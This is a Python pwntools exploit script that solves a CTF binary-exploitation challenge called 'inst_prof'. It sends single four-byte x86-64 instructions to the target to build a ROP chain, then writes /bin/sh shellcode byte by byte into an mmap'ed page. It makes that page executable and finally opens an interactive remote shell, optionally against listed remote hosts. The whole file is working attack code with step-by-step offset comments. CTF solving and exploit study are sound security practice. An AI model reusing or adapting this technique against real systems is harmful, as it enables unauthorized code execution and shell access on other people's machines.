#!/usr/bin/env python
# coding: utf8
from pwn import *

# FILL binary and host, port
binary = './inst_prof'
host, port = 'inst-prof.ctfcompetition.com:1337'.split(':')
host, port ='notmonitoringyourinternettraffic.ns.agency:8017'.split(':')
port = int(port)

e = ELF(binary)
context.os = 'linux'
context.arch = e.arch

### LAUNCH THE BINARY/CONNECT ETC
if args['REMOTE']:
    p = remote(host, port)
elif args['GDB']:
    if args['GDB'] == 'SHORT':
        gdbscript = 'break *&do_test+86'
    else:
        gdbscript = 'b main\nc\nc\nbreak *&do_test+86'
        print('Setting gdbscript so we will break at 2nd main execution, this may take long time')
    print('gdbscript = %s' % repr(gdbscript))
    p = gdb.debug(binary, gdbscript=gdbscript)
else:
    p = process(binary)

p.recvuntil('initializing prof...ready\n')
info('Received HELLO from 1st main execution.')

def send_instr(instrs):
    payload = asm(instrs, arch='amd64')

    if len(payload) < 4:
        payload += asm('ret', arch='amd64')

    assert len(payload) <= 4, "Payload too long: %s" % instrs

    p.send(payload)

instructions = [
    'lea r14, [rbp-72]',    # load address of pointer to 0xaa3 to r14
    'mov r15, [r14]',       # copy value under the pointer (0xaa3) to r15
    'mov r14, r15',         # copy the value to r14, both r14 and r15 hold 0xaa3
    'lea r15, [r14-116]',   # r15 = r14-116, r15 is now 0xaa3 - 116 = 0xa2f
    'mov r14, r15',         # r14 = r15,     r14 is now 0xa2f
    'lea r15, [r14-63]',    # r15 = r14-63,  r15 is now 0xa2f -  63 = 0x9f0, r15 now points to alloc_page
    'mov [r13], r15',       # put alloc_page addr on the stack

    # Below line is here just for testing purposes
    # It changes RSP so that we start ROP chain leaving do_test function
    #'mov rsp, r13'

    # Grabs mmap'ed memory page address to r15
    'lea r14, [rbp-64]',    # load address of pointer to mmap'ed page to r14
    'mov r15, [r14]',       # copy value under the pointer to r15
]

# subtract r15 address by 128*32 = 4096 (0x1000)
# so r15 will point to the later/new mmap'ed page, where we will put shellcode
instructions += [
    'mov r14, r15',
    'lea r15, [r14-128]',
] * 32

# copies main address to [r13+8]
instructions += [
    'mov r14, [rbp+56]',    # gets main address to r14
    'mov [r13+8], r14',     # puts main address under memory pointed by r13+8
]
# After above we will have r13 storing a stack addr where we will have:
# +0: `alloc_page` function address
# +8: `main` function address
#
# Below instruction will start our ROP chain
instructions += ['mov rsp, r13']

for instr in instructions:  # execute first part of our ROP
    send_instr(instr)

p.recvuntil('initializing prof...ready\n')
info('Received HELLO from 2nd main execution.')

payload = shellcraft.amd64.sh()
shellcode_bytes = map(ord, asm(payload, os='linux', arch='amd64'))

send_instr('mov r14, r15')  # make a copy of begining of mmap'ed memory region address for later use
for byte in shellcode_bytes:
    send_instr('mov BYTE PTR [r15], %d' % byte)     # put shellcode byte
    send_instr('inc r15')                           # advance to next memory cell

##### Below we put our ROP chain on the stack (r13 points to some stack region):
# [r13 +8] - address of `pop rdi; pop` gadget
# [r13+16] - mmap'ed memory address, pop rdi will eat it
# [r13+24] - make_page_executable - changes memory region to readable and executable
# [r13+32] - address of readable and executable memory that contains our shellcode

##### saving shellcode/mmap'ed memory region address to the stack
send_instr('mov [r13+16], r14') # saving shellcode address so `pop rdi` gets it
send_instr('mov [r13+32], r14') # saving shellcode so rop jumps to it

##### gets `pop rdi; pop` gadget address
# rsp  0x7ffd907db1d0 —▸ 0x55cb935cfb18 (do_test+88) ◂— rdtsc
send_instr('mov r14, [rsp]') # r14 will have do_test+88 address = 0xb18
# 0xbc3-0xb18 = 171 - we need to advance r14 by 171
send_instr('lea r15, [r14+127]')    # r15 = 0xb18 + 127 = 0xb97
send_instr('mov r14, r15')          # r14 = r15 = 0xb97
send_instr('lea r15, [r14+44]')     # r15 = 0xb97 + 44 = 0xbc3 (`pop rdi; pop` gadget addr)
send_instr('mov [r13+8], r15')      # save gadget address to the stack

###### gets `make_page_executable` address (0xa20) to r13+24
# 06:0030│      0x7fff73937360 —▸ 0x55573d395aa3 (read_n+35) ◂— mov    byte ptr [rbx - 1], al
# 0f:0078│ rbp  0x7fff739373a8
send_instr('mov r14, [rbp-72]')     # r14 = addr —▸ aa3
send_instr('lea r15, [r14-127]')    # r15 = 0xaa3 - 127 = 0xa24
send_instr('mov r14, r15')          # r14 = r15 = 0xa24
send_instr('lea r15, [r14-4]')      # r15 = 0xa24 - 4 = 0xa20
send_instr('mov [r13+24], r15')     # save `make_page_executable` addr to the stack

###### "MAKE ROPCHAIN GREAT AGAIN!" - executes our rop chain
send_instr('lea rsp, [r13+8]')

p.interactive()
